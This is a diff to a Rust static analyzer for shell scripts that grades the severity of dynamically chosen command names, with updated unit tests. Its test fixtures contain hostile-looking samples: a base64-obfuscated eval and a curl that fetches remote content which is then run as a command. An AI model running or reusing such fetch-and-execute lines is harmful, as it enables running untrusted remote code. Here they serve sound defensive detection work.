@@ -29,6 +29,7 @@
 //!     enables word-splitting of a single variable into command + arguments
 //!     → IfsManipulation WARN.
 
+use std::collections::HashMap;
 use std::path::Path;
 
 use tree_sitter::{Node, Parser};
@@ -64,7 +65,8 @@ pub fn analyze(path: &Path, bytes: &[u8]) -> AstOutcome {
     };
     let index = LineIndex::new(bytes);
     let mut findings = Vec::new();
-    walk(root, bytes, path, &index, &mut findings);
+    let assigned = collect_assignments(root, bytes);
+    walk(root, bytes, path, &index, &assigned, &mut findings);
     AstOutcome {
         findings,
         parse_error,
@@ -72,11 +74,80 @@ pub fn analyze(path: &Path, bytes: &[u8]) -> AstOutcome {
     }
 }
 
-fn walk(root: Node, bytes: &[u8], path: &Path, index: &LineIndex, findings: &mut Vec<Finding>) {
+/// Variables assigned in the file: `true` when any assignment's value runs
+/// code (a command or process substitution), `false` when every one is plain
+/// text or other variables (`rm="rm -f"`, `run=:`, `show="$echo"`).
+type Assignments = HashMap<String, bool>;
+
+fn collect_assignments(root: Node, bytes: &[u8]) -> Assignments {
+    let mut out = Assignments::new();
+    let mut stack = vec![root];
+    while let Some(node) = stack.pop() {
+        if node.kind() == "variable_assignment" {
+            if let Some(name) = node.child_by_field_name("name") {
+                let runs_code = node
+                    .child_by_field_name("value")
+                    .is_some_and(contains_substitution);
+                *out.entry(node_text(name, bytes).to_string())
+                    .or_insert(false) |= runs_code;
+            }
+        }
+        for i in (0..node.child_count() as u32).rev() {
+            if let Some(child) = node.child(i) {
+                stack.push(child);
+            }
+        }
+    }
+    out
+}
+
+/// True if `node` contains code the shell runs to produce a value:
+/// `$(…)`, backticks, `<(…)`, or `$((…))`.
+fn contains_substitution(node: Node) -> bool {
+    if matches!(
+        node.kind(),
+        "command_substitution" | "process_substitution" | "arithmetic_expansion"
+    ) {
+        return true;
+    }
+    let mut cursor = node.walk();
+    let found = node.children(&mut cursor).any(contains_substitution);
+    found
+}
+
+/// Names of the variables expanded in `node` (`$echo`, `${SED}`, `$1`).
+fn expanded_variables(node: Node, bytes: &[u8], out: &mut Vec<String>) {
+    let mut cursor = node.walk();
+    let children: Vec<Node> = node.children(&mut cursor).collect();
+    if matches!(node.kind(), "simple_expansion" | "expansion") {
+        let name = children
+            .iter()
+            .find(|c| matches!(c.kind(), "variable_name" | "special_variable_name"));
+        if let Some(name) = name {
+            let name = node_text(*name, bytes).to_string();
+            if !out.contains(&name) {
+                out.push(name);
+            }
+            return;
+        }
+    }
+    for child in children {
+        expanded_variables(child, bytes, out);
+    }
+}
+
+fn walk(
+    root: Node,
+    bytes: &[u8],
+    path: &Path,
+    index: &LineIndex,
+    assigned: &Assignments,
+    findings: &mut Vec<Finding>,
+) {
     let mut stack = vec![root];
     while let Some(node) = stack.pop() {
         match node.kind() {
-            "command" => check_command(node, bytes, path, index, findings),
+            "command" => check_command(node, bytes, path, index, assigned, findings),
             "pipeline" => check_pipeline(node, bytes, path, index, findings),
             "function_definition" => check_function_shadow(node, bytes, path, index, findings),
             "variable_assignment" => check_ifs_manipulation(node, bytes, path, index, findings),
@@ -105,6 +176,7 @@ fn check_command(
     bytes: &[u8],
     path: &Path,
     index: &LineIndex,
+    assigned: &Assignments,
     findings: &mut Vec<Finding>,
 ) {
     let Some(name_node) = node.child_by_field_name("name") else {
@@ -112,8 +184,12 @@ fn check_command(
     };
 
     // When the command name itself is a variable expansion or substitution,
-    // the executed command is determined at runtime — equivalent to eval.
-    if is_dynamic_expression(name_node, bytes) {
+    // the executed command is determined at runtime. Graded by what the file
+    // shows: computed by running code (critical), a variable set elsewhere,
+    // as build scripts run `$CC`, `$SED`, libtool's `$echo` (warn), or one
+    // the file sets only to plain text, `rm="rm -f"; $rm x` (info).
+    if is_dynamic_expression(name_node, bytes) && !continues_assignment(name_node) {
+        let (severity, confidence, message) = dynamic_command_name(name_node, bytes, assigned);
         let off = node.start_byte();
         let (line, col) = index.locate(off);
         findings.push(Finding {
@@ -123,9 +199,9 @@ fn check_command(
             col,
             pass: PassKind::Ast,
             kind: SignalKind::DynamicExecution,
-            severity: Severity::Critical,
-            confidence: 0.90,
-            message: "command name is a variable or substitution — executed command determined at runtime".to_string(),
+            severity,
+            confidence,
+            message,
             snippet: redact_snippet(&snippet_around(bytes, off, 100)),
             diff_introduced: false,
         });
@@ -960,6 +1036,64 @@ fn command_arguments<'a>(cmd_node: Node<'a>) -> Vec<Node<'a>> {
 /// expansion (`$var`, `${var}`, `$1`), a command substitution (`` `cmd` ``
 /// / `$(cmd)`), or a process substitution (`<(cmd)` / `>(cmd)`). A plain
 /// quoted or unquoted word is considered static/literal.
+/// True if the command name is glued to an assignment just before it, with
+/// no whitespace between: to the shell they are one word, all assignment.
+/// tree-sitter splits `qarg=\"`$echo …`\"` (libtool) after the escaped quote
+/// and parses the backtick part as the command name.
+fn continues_assignment(name_node: Node) -> bool {
+    name_node.prev_sibling().is_some_and(|prev| {
+        prev.kind() == "variable_assignment" && prev.end_byte() == name_node.start_byte()
+    })
+}
+
+/// Severity, confidence, and message for a command whose name is dynamic.
+/// Every message starts "command name is a variable", which the markup
+/// prose scan uses to leave this form out.
+fn dynamic_command_name(
+    name_node: Node,
+    bytes: &[u8],
+    assigned: &Assignments,
+) -> (Severity, f32, String) {
+    if contains_substitution(name_node) {
+        return (
+            Severity::Critical,
+            0.90,
+            "command name is a variable or substitution — executed command determined at runtime"
+                .to_string(),
+        );
+    }
+    let mut vars = Vec::new();
+    expanded_variables(name_node, bytes, &mut vars);
+    let shown = vars
+        .iter()
+        .map(|v| format!("`${v}`"))
+        .collect::<Vec<_>>()
+        .join(", ");
+    if let Some(v) = vars.iter().find(|v| assigned.get(*v) == Some(&true)) {
+        return (
+            Severity::Critical,
+            0.90,
+            format!(
+                "command name is a variable ({shown}) and `{v}` is assigned the output of a command — executed command determined at runtime"
+            ),
+        );
+    }
+    if !vars.is_empty() && vars.iter().all(|v| assigned.contains_key(v)) {
+        return (
+            Severity::Info,
+            0.40,
+            format!("command name is a variable ({shown}) that this file sets only to plain text"),
+        );
+    }
+    (
+        Severity::Warn,
+        0.70,
+        format!(
+            "command name is a variable ({shown}) not set in this file — the caller or environment decides what runs"
+        ),
+    )
+}
+
 fn is_dynamic_expression(node: Node, bytes: &[u8]) -> bool {
     match node.kind() {
         // Variable expansion forms
@@ -1004,13 +1138,52 @@ mod tests {
     }
 
     #[test]
-    fn variable_as_command_name_is_critical() {
-        let findings = run(b"$cmd\n");
-        let hit = findings
-            .iter()
-            .find(|f| f.kind == SignalKind::DynamicExecution)
-            .expect("expected DynamicExecution when command name is a variable");
-        assert_eq!(hit.severity, Severity::Critical);
+    fn variable_as_command_name_is_graded_by_what_the_file_shows() {
+        let graded = |src: &[u8]| {
+            run(src)
+                .into_iter()
+                .filter(|f| f.message.starts_with("command name is a variable"))
+                .map(|f| (f.line, f.severity))
+                .collect::<Vec<_>>()
+        };
+        // Computed by running code: in the name, or assigned to the variable.
+        assert_eq!(
+            graded(b"$(echo ZXZhbA== | base64 -d) x\n"),
+            [(1, Severity::Critical)]
+        );
+        assert_eq!(
+            graded(b"c=$(curl -s https://x.invalid/c)\n$c\n"),
+            [(2, Severity::Critical)]
+        );
+        assert_eq!(
+            graded(b"c=rm\nc=`cat f`\n$c x\n"),
+            [(3, Severity::Critical)]
+        );
+        // Set elsewhere: libtool's `$echo`, a build's `$CC`, a positional `$1`.
+        assert_eq!(
+            graded(b"$echo \"msg\" 1>&2\n${CC} -c a.c\n\"$1\" --version\n"),
+            [
+                (1, Severity::Warn),
+                (2, Severity::Warn),
+                (3, Severity::Warn)
+            ]
+        );
+        // Set in the file to plain text or other variables.
+        assert_eq!(
+            graded(b"rm=\"rm -f\"\nrun=:\nshow=\"$echo\"\n$rm x\n$run $show y\n"),
+            [(4, Severity::Info), (5, Severity::Info)]
+        );
+        // An assignment the parser splits into a command (libtool): only
+        // the commands inside the backticks remain, set elsewhere (warn).
+        assert_eq!(
+            graded(b"qarg=\\\"`$echo \"X$arg\" | $Xsed -e s/a/b/`\\\"\n"),
+            [(1, Severity::Warn), (1, Severity::Warn)]
+        );
+        let msgs: Vec<String> = run(b"$echo hi\n").into_iter().map(|f| f.message).collect();
+        assert_eq!(
+            msgs,
+            ["command name is a variable (`$echo`) not set in this file — the caller or environment decides what runs"]
+        );
     }
 
     #[test]
